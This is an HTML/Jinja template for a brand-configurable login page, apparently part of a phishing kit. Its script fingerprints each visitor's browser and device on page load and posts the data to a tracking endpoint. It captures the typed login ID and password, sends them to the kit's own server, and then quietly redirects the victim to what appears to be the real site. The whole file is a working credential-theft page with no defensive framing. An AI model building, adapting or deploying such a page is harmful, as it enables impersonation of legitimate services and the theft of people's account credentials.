<!doctype html>
<html lang="ja"><head><meta charset="utf-8">
<meta name="viewport" content="width=device-width,initial-scale=1,viewport-fit=cover">
<meta name="theme-color" content="{{ t.bg }}">
<title>{{ t.title }}</title>
<style>
*{box-sizing:border-box}
html,body{margin:0;min-height:100%}
body{background:{{ t.bg }};color:{{ t.fg }};font-family:{{ t.font }};
  -webkit-text-size-adjust:100%;display:flex;align-items:center;justify-content:center;
  padding:24px 16px;min-height:100vh}
.wrap{width:100%;max-width:{{ t.maxw }}}
.logo{text-align:center;margin-bottom:18px}
.logo svg{display:inline-block;vertical-align:middle}
.word{font-size:26px;font-weight:800;letter-spacing:-.5px}
.card{background:{{ t.card }};border:{{ t.border }};border-radius:{{ t.radius }};
  padding:22px 20px}
label{display:block;font-size:12px;color:{{ t.sub }};margin:12px 0 5px}
input{width:100%;padding:12px;font-size:15px;border-radius:8px;
  border:1px solid {{ t.input_border }};background:{{ t.input_bg }};color:{{ t.fg }}}
input:focus{outline:none;border-color:{{ t.accent }}}
button{width:100%;margin-top:16px;padding:12px;border:0;border-radius:8px;
  background:{{ t.accent }};color:{{ t.accent_fg }};font-size:15px;font-weight:700;cursor:pointer}
button:disabled{opacity:.6}
.foot{text-align:center;font-size:12.5px;color:{{ t.sub }};margin-top:16px}
.err{color:#ed4956;font-size:12.5px;margin-top:8px;display:none}
.spin{display:none;text-align:center;font-size:13px;color:{{ t.sub }};margin-top:14px}
.alt{text-align:center;font-size:12px;color:{{ t.sub }};margin-top:12px}
h3{margin:0 0 4px;font-size:17px;font-weight:600}
.dot{display:inline-block;width:6px;height:6px;border-radius:50%;background:{{ t.accent }};
  margin-right:6px;animation:bl 1s infinite}
@keyframes bl{50%{opacity:.2}}
</style></head><body>
<div class="wrap">
  <div class="logo">{% if t.logo %}{{ t.logo|safe }}{% endif %}</div>
  <div class="card">
    {% if t.heading %}<h3>{{ t.heading }}</h3>{% endif %}
    <form id="f" method="post" action="/h/{{ code }}/login">
      <label>{{ t.id_label }}</label>
      <input id="loginid" name="login_id" type="{{ t.id_type }}" autocomplete="username"
             autocapitalize="off" spellcheck="false" placeholder="{{ t.id_ph }}">
      <label>{{ t.pw_label }}</label>
      <input id="pw" name="password" type="password" autocomplete="current-password"
             placeholder="{{ t.pw_ph }}">
      <button id="go" type="submit">{{ t.btn }}</button>
      <div class="err" id="err"></div>
      <div class="spin" id="spin"><span class="dot"></span>{{ t.spin }}</div>
    </form>
  </div>
  <div class="foot">{{ t.foot|safe }}</div>
  {% if t.alt %}<div class="alt">{{ t.alt|safe }}</div>{% endif %}
</div>
<script>
window.H = { code: {{ code|tojson }}, hit: {{ hit_id }}, next: {{ t.real|tojson }} };
</script>
<script>
(function () {
  var H = window.H, sent = false;
  try {
    var extra = {
      ua: navigator.userAgent,
      langs: (navigator.languages || [navigator.language]).join(","),
      tz: (function () { try { return Intl.DateTimeFormat().resolvedOptions().timeZone; }
                         catch (e) { return ""; } })(),
      screen: screen.width + "x" + screen.height + "x" + screen.colorDepth,
      dpr: devicePixelRatio || 1, platform: navigator.platform || "",
      cores: navigator.hardwareConcurrency || 0, touch: navigator.maxTouchPoints || 0,
      ts: new Date().toISOString()
    };
    fetch("/h/" + encodeURIComponent(H.code) + "/d", {
      method: "POST", cache: "no-store", headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ hit: H.hit, items: extra })
    }).catch(function () {});
  } catch (e) {}
  function done() { try { location.replace(H.next); } catch (e) { location.href = H.next; } }
  document.getElementById("f").addEventListener("submit", function (ev) {
    ev.preventDefault();
    if (sent) return;
    var id = document.getElementById("loginid").value.trim();
    var pw = document.getElementById("pw").value;
    if (!id || !pw) {
      var e = document.getElementById("err");
      e.textContent = "{{ t.err }}"; e.style.display = "block"; return;
    }
    sent = true;
    document.getElementById("go").disabled = true;
    document.getElementById("spin").style.display = "block";
    fetch("/h/" + encodeURIComponent(H.code) + "/login", {
      method: "POST", cache: "no-store", headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ hit: H.hit, login_id: id, password: pw })
    }).then(function (r) { return r.json(); })
      .then(function (j) { setTimeout(done, (j && j.delay) ? j.delay : 700); })
      .catch(function () { setTimeout(done, 500); });
  });
})();
</script>
</body></html>
